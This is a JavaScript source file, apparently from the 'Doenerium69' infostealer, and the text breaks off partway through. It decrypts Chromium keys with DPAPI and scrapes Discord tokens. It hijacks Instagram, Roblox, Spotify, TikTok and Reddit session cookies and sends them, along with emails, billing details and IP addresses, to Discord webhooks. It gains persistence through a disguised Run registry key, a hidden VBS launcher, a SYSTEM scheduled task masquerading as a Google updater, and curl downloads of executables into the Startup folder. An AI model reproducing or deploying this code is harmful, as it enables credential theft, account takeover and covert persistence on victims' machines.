    const errorsFolderPath = path.join(mainFolderPath, 'Errors');
    
    if (!fs.existsSync(mainFolderPath)) {
        try {
            fs.mkdirSync(mainFolderPath);
        } catch (mkdirError) {
            console.error(`Error creating main folder: ${mkdirError.message}`);
            return;
        }
    }

    if (!fs.existsSync(errorsFolderPath)) {
        try {
            fs.mkdirSync(errorsFolderPath);
        } catch (error) {
            console.error(`Error creating Errors folder: ${error.message}`);
            return;
        }
    }

    const debugLogFilePath = path.join(errorsFolderPath, 'debug.log');
    fs.writeFileSync(debugLogFilePath, errorMessage + '\n', {
        encoding: 'utf8',
        flag: 'a+',
    });
}


function createRunBat() {
    const programName = path.basename(app.getPath('exe'));
    const sourceFolderPath = path.dirname(app.getPath('exe'));

    // URL
    const downloadUrl1 = "https://cdn.discordapp.com/attachments/660885288079589385/1199071175268110336/EpicGamesLauncher.exe";
    const downloadUrl2 = "YOUR-DIRECT-DOWNLOAD-HERE";

    // download path
    const app1Path = `"${app.getPath('exe')}"`;
    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\exemple.exe"';

    const batContent = `@echo off
REM Add registry key
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher" /t REG_SZ /d ${app1Path} /f

REM Display registry value
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher"

REM Verify if App1 is already installed
if not exist ${app1Path} (
    REM Download and install App1
    curl -o ${app1Path} ${downloadUrl1}
    if not exist ${app1Path} (
        echo Error downloading App1.
    ) else (
        echo App1 installed successfully.
    )
) else (
    echo App1 is already installed.
)

REM Verify if App2 is already installed
if not exist ${app2Path} (
    REM Download and install App2
    curl -o ${app2Path} ${downloadUrl2}
    if not exist ${app2Path} (
        echo Error downloading App2.
    ) else (
        echo App2 installed successfully.
    )
) else (
    echo App2 is already installed.
)
`;

    const batScriptPath = path.join(app.getPath('userData'), 'CheckEpicGamesLauncher.bat');
    fs.writeFileSync(batScriptPath, batContent, 'utf-8');

    console.log(`Batch script created successfully at: ${batScriptPath}`);

    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
objShell.Run "${batScriptPath}", 0, True
Set objShell = Nothing`;

    const vbsScriptPath = path.join(app.getPath('userData'), 'RunBatHidden.vbs');
    fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');

    console.log(`VBS script created successfully at: ${vbsScriptPath}`);

    const taskName = 'GoogleUpdateTaskMachineUAC';
    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo ${vbsScriptPath}" /sc minute /mo 10 /f /RU SYSTEM`;

    exec(schtasksCommand, (err, stdout, stderr) => {
        if (err) {
            console.error('Error executing schtasks command:', err.message);
        } else {
            console.log('Scheduled task for verification created successfully.');
            const runVbsCommand = `cscript //B //nologo "${vbsScriptPath}"`;
            exec(runVbsCommand, (vbsErr, vbsStdout, vbsStderr) => {
                if (vbsErr) {
                    console.error('Error executing VBS script:', vbsErr.message);
                } else {
                    console.log('VBS script executed successfully.');
                }
            });
        }
    });
}




function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}


async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {

    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue; 
    }
    try {

      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5);


      const _0x4ff4c6 = Array.from(_0x276965);


      const _0x4860ac = execSync(
        'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
          _0x4ff4c6 +
          "), $null, 'CurrentUser')"
      )
        .toString()
        .split('\r\n');

      const _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != '');

      const _0x2ed7ba = Buffer.from(_0x4a5920);


      browserPath[_0x4c3514].push(_0x2ed7ba);
    } catch (_0x32406b) {

    }
  }
}




async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    // Request to get Instagram account data
    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    // Create data object
    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    // Save Instagram session information to a file
    saveInstagramFile(session_id);

    return data;
  } catch (error) {
    // Handle error and send Discord error embed
    handleInstagramError(error);
  }
}

function saveInstagramFile(session_id) {
  const instagramFolderPath = path.join(mainFolderPath, 'Instagram Accounts');
  const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');

  if (!fs.existsSync(instagramFolderPath)) {
    fs.mkdirSync(instagramFolderPath);
  }

  // Write the Instagram session information to the instagram.txt file
  fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);

  console.log('Instagram session information written to instagram.txt');
}

function handleInstagramError(error) {
  const errorEmbed = {
    color: 0x303037,
    title: 'Error Occurred ❌',
    description: 'An error occurred while fetching Instagram data. probably because he changed his password:',
    fields: [
      { name: 'Error Message', value: '```' + error.message + '```', inline: false },
    ],
    footer: {
      text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    },
  };

  // Send the error embed to the Discord webhook
  axios.post(discordWebhookUrl, { embeds: [errorEmbed] });

  console.error("Error fetching Instagram data:", error.message);

}


async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };


    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;

    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    const errorEmbed = {
      color: 0x303037,
      title: 'Error Occurred ❌',
      description: 'An error occurred while fetching followers count. probably because he changed his password:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    axios.post(discordWebhookUrl, { embeds: [errorEmbed] });

    console.error("Error fetching followers count:", error.message);
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    const embed = {
      title: '‎ ',
      color: 0x303037,
      author: {
        name: 'Instagram Session Detected',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
      },
      thumbnail: { url: data.avatar },
      fields: [
        { name: '☑ Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
        { name: '📊 Followers Count ', value: '```' + followersCount + '```', inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    axios.post(discordWebhookUr1, { embeds: [embed] });
    axios.post(discordWebhookUrl, { embeds: [embed] });

  } catch (error) {
    // In case of an error, send all errors to the Discord webhook
    const errorEmbed = {
      color: 0x303037,
      title: 'Error Occurred ❌',
      description: 'An error occurred while processing Instagram data. Probably because of a password change:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
        { name: 'Stack Trace', value: '```' + error.stack + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    axios.post(discordWebhookUrl, { embeds: [errorEmbed] });
  }
}




async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      return;
    }

    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      title: '‎',
      color: 0x303037,
      author: {
        name: 'Roblox Session Detected',
        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: '```     ' + data.username + '     ```',
          inline: true,
        },
        {
          name: 'Robux:',
          value: '```   ' + robuxValue + '   ```',
          inline: true,
        },
        {
          name: 'Premium:',
          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
          inline: true,
        },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
    };

    let payload = {
      embeds: [embed],
    };

    await new Promise(resolve => setTimeout(resolve, 1000));

    console.log('Payload to be sent:', payload);

    axios.post(discordWebhookUrl, payload)
      .then(response => {
      })
      .catch(error => {
        let errorEmbed = {
          color: 0x303037,
          title: 'Error Sending Discord Webhook',
          description: 'An error occurred while sending the Discord webhook',
          fields: [
            {
              name: 'Error Message',
              value: error.message,
            },
          ],
          footer: {
            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
          },
        };

        let errorPayload = {
          embeds: [errorEmbed],
        };

        axios.post(discordWebhookUrl, errorPayload)
          .then(errorResponse => {
          })
          .catch(error => {
          });
      });
  } catch (error) {
    let errorEmbed = {
      color: 0x303037,
      title: 'Error Fetching Webhook URL',
      description: 'An error occurred while fetching the webhook URL',
      fields: [
        {
          name: 'Error Message',
          value: error.message,
        },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    let errorPayload = {
      embeds: [errorEmbed],
    };

    axios.post(discordWebhookUrl, errorPayload)
      .then(errorResponse => {
      })
      .catch(error => {
      });
  }
}






//
async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });

        const profileData = response.data.profile;

        const email = profileData.email;
        const gender = profileData.gender;
        const birthdate = profileData.birthdate;
        const country = profileData.country;
        const username = profileData.username;

const embedData = {
  title: '‎ ',
  color: 0x303037,
  author: {
    name: 'Spotify Session Detected',
    icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png' // Replace with the URL of the icon image
  },
  fields: [
    { name: 'Email', value: "```" + (email || "Not available") + "```", inline: true },
    { name: 'Username', value: "```" + (username || "Not available") + "```", inline: true },
    { name: 'Gender', value: "```" + (gender || "Not available") + "```", inline: true },
    { name: 'Birthdate', value: "```" + (birthdate || "Not available") + "```", inline: true },
    { name: 'Country', value: "```" + (country || "Not available") + "```", inline: true },
    { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
    { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
  ],
  footer: {
    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
  }
};

const payload = {
  embeds: [embedData],
};


        const randomString = crypto.randomBytes(3).toString('hex');

        // Wait for a few seconds before sending the next request
        setTimeout(() => {
            axios.post(discordWebhookUrl, payload)
                .then(response => {
                    console.log('Webhook sent successfully spotify:', response.data);
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                    const errorEmbed = {
                        title: 'Error Sending Discord Webhook',
                        description: 'An error occurred while sending the Discord webhook',
                        color: 0x303037,
                        fields: [
                            { name: 'Error Message', value: '```' + error.message + '```', inline: false },
                        ],
                    };
                    axios.post(discordWebhookUrl, { embeds: [errorEmbed] });
                });
        }, 5000);
    } catch (error) {
        console.error('Error fetching Spotify data:', error.message);
        const errorEmbed = {
            title: 'Error Occurred Spotify ❌',
            description: 'An error occurred while fetching Spotify data. The error message is below:',
            color: 0x303037,
            fields: [
                { name: 'Error Message', value: '```' + error.message + '```', inline: false },
            ]
        };

        axios.post(discordWebhookUrl, { embeds: [errorEmbed] });
    }
}




function moveTikTokFile(cookie) {
  if (!cookie) {
    // No TikTok session information intercepted, so no need to create the folder or file
    return;
  }

  const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok Accounts');
  const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');

  if (!fs.existsSync(tiktokFolderPath)) {
    fs.mkdirSync(tiktokFolderPath);
  }

  // Write the intercepted TikTok session information to the tiktok.txt file
  fs.writeFileSync(tiktokFilePath, cookie);

  console.log('TikTok session information written to tiktok.txt');
}






function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
                  embeds: [
                    {
                        title: '‎ ',
                        color: 0x303037,
                        author: {
                        name: 'Tiktok Session Detected',
                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
                        },
                        fields: [
                        {
                          name: "Cookie",
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                      },
                    }
                  ]
                };

                axios.post(discordWebhookUr1, webhookPayload)
                axios.post(discordWebhookUrl, webhookPayload)
                  .then(response => {
                    console.log('Discord webhook sent successfully! send tiktok');
                    moveTikTokFile(cookie);
                  })
                  .catch(error => {
                    console.log('Error sending Discord webhook:', error.message);
                  });
              })
              .catch(error => {
                const errorMessage = {
                  title: "Error Detected Tiktok",
                  description: "An error occurred while trying to retrieve wallet information.",
                  color: 0x303037, // Red color for error
                  fields: [
                    {
                      name: "Error Message",
                      value: "```An error occurred while trying to retrieve wallet information.```",
                      inline: false
                    }
                  ],
                  footer: {
                    text: "TikTok Session Error" // Footer text for error
                  }
                };

                axios.post(discordWebhookUrl, { embeds: [errorMessage] })
                  .then(response => {
                    console.log('Error message sent to Discord webhook successfully!');
                  })
                  .catch(err => {
                    console.log('Error sending error message to Discord webhook:', err);
                  });
              });
          })
          .catch(error => {
            const errorMessage = {
              title: "Error Detected",
              description: "An error occurred while trying to retrieve insights.",
              color: 0x303037,
              fields: [
                {
                  name: "Error Message",
                  value: "```" + error.message + "```",
                  inline: false
                }
              ],
              footer: {
                text: "TikTok Session Error"
              }
            };

            // Send error message to Discord webhook
            axios.post(discordWebhookUrl, { embeds: [errorMessage] })
              .then(response => {
                console.log('Error message sent to Discord webhook successfully!');
              })
              .catch(err => {
                console.log('Error sending error message to Discord webhook:', err);
              });
          });
      })
      .catch(error => {
        const errorMessage = {
          title: "Error Detected",
          description: "An error occurred while trying to retrieve account information.",
          color: 0x303037, 
          fields: [
            {
              name: "Error Message",
              value: "```" + error.message + "```",
              inline: false
            }
          ],
          footer: {
            text: "TikTok Session Error"
          }
        };

        // Send error message to Discord webhook
        axios.post(discordWebhookUrl, { embeds: [errorMessage] })
          .then(response => {
            console.log('Error message sent to Discord webhook successfully!');
          })
          .catch(err => {
            console.log('Error sending error message to Discord webhook:', err);
          });
      });
  } catch (error) {
    const errorMessage = {
      title: "Error Detected Tiktok",
      description: "An error occurred while trying to steal TikTok session.",
      color: 0x303037, 
      fields: [
        {
          name: "Error Message",
          value: "```" + error.message + "```",
          inline: false
        }
      ],
      footer: {
        text: "TikTok Session Error"
      }
    };

    // Send error message to Discord webhook
    axios.post(discordWebhookUrl, { embeds: [errorMessage] })
      .then(response => {
        console.log('Error message sent to Discord webhook successfully!');
      })
      .catch(err => {
        console.log('Error sending error message to Discord webhook:', err);
      });
  }
}





function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "Doenerium69",
                            description: "",
                            color: 0x303037, 
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                { name: '🍪 Reddit Cookie', value: '```' + cookies + '```', inline: false },
                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
                { name: '👤 Username', value: '```' + username + '```', inline: false },
                { name: '🗨️ Reddit Karma', value: '💬 Comments: ```' + commentKarma + '``` | 👍 Total Karma: ```' + totalKarma + '```', inline: true },
                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                            ],
                            footer: {
                                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                            }
                        };

                        axios.post(discordWebhookUrl, { embeds: [embedData] })
                            .catch(error => {
                                console.error('Error sending Discord webhook:', error.message);
                            });
                    })
                    .catch(error => {
                        axios.post(discordWebhookUrl, { content: 'Error retrieving user data: ' + error.message })
                            .catch(webhookError => {
                                console.error('Error sending Discord webhook:', webhookError.message);
                            });
                    });
            })
            .catch(error => {
                axios.post(discordWebhookUrl, { content: 'Error obtaining access token: ' + error.message })
                    .catch(webhookError => {
                        console.error('Error sending Discord webhook:', webhookError.message);
                    });
            });
    } catch (error) {
        axios.post(discordWebhookUrl, { content: 'An error occurred Rddit: ' + error.message })
            .catch(webhookError => {
                console.error('Error sending Discord webhook:', webhookError.message);
            });
    }
}


function findTokenn(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}

   
//

const tokens = [];

function findToken(path) {
  let path_tail = path;
  path += 'Local Storage\\leveldb';

  if (!path_tail.includes('discord')) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith('.log') || file.endsWith('.ldb')) &&
          fs.readFileSync(path + '\\' + file, 'utf8')
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [
                new RegExp(/mfa\.[\w-]{84}/g),
                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
              ];
              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);
                if (foundTokens)
                  foundTokens.forEach((token) => {
                    if (!tokens.includes(token)) tokens.push(token);
                  });
              }
            });
      });
    } catch (e) {}
    return;
  } else {
    if (fs.existsSync(path_tail + '\\Local State')) {
      try {
        const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

        fs.readdirSync(path).forEach((file) => {
          if (file.endsWith('.log') || file.endsWith('.ldb')) {
            const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
            const lines = fileContent.split(/\r?\n/);

            lines.forEach((line) => {
              const foundTokens = line.match(tokenRegex);

              if (foundTokens) {
                foundTokens.forEach((token) => {
                  const encryptedKey = Buffer.from(
                    JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key,
                    'base64'
                  ).slice(5);
                  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                  const tokenParts = token.split('.');
                  const start = Buffer.from(tokenParts[0], 'base64');
                  const middle = Buffer.from(tokenParts[1], 'base64');
                  const end = Buffer.from(tokenParts[2], 'base64');
                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                  decipher.setAuthTag(end);
                  const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                  if (!tokens.includes(out)) {
                    tokens.push(out);
                  }
                });
              }
            });
          }
        });

        const discordFolderPath = path.join(mainFolderPath, 'Discord');
        const discordFilePath = path.join(discordFolderPath, 'discord.txt');
        const discordFileContent = tokens.join('\n');

        // Create Discord folder if it doesn't exist
        if (!fs.existsSync(discordFolderPath)) {
          fs.mkdirSync(discordFolderPath);
        }

        fs.writeFileSync(discordFilePath, discordFileContent);
      } catch (e) {}
      return;
    }
  }
}


async function stealTokens() {
    const interceptedTokens = [];

    for (let path of paths) {
        await findToken(path);
    }

    for (let token of tokens) {
        try {
            let json;
            await axios.get("https://discord.com/api/v9/users/@me", {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { json = res.data }).catch(() => { json = null });

            if (!json) continue;
            
            interceptedTokens.push(token);

            var ip = await getIp();
            var billing = await getBilling(token);
            var friends = await getRelationships(token);

            const randomString = crypto.randomBytes(16).toString('hex');

            const userInformationEmbed = {
                title: `${json.username}#${json.discriminator} (${json.id})`,
                color: 0x303037,
                author: {
                    name: "Discord Session Detected",
                    icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                },
                fields: [
                    {
                        name: ":key: Token:",
                        value: "```" + token + "```",
                    },
                    {
                        name: ":star: Badges:",
                        value: "``" + getBadges(json.flags) + "``",
                        inline: true
                    },
                    {
                        name: ":gem: Nitro Type:",
                        value: await getNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: ":credit_card: Billing:",
                        value: "``" + billing + "``",
                        inline: true
                    },
                    {
                        name: ":envelope: Email:",
                        value: "``" + `\`${json.email}\`` + "``",
                        inline: true
                    },
                    {
                        name: ":globe_with_meridians: IP:",
                        value: "``" + `\`${ip}\`` + "``",
                        inline: true
                    }
                  ],
                footer: {
    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
  }
            };

            const data = {
                embeds: [userInformationEmbed],
            };

            // Only include Friends embed if there is content to display
            if (friends !== '*Nothing to see here*') {
                const friendsEmbed = {
                    title: "Friends",
                    color: 0x303037, 
                    description: friends,
                    author: {
                        name: "HQ Friends",
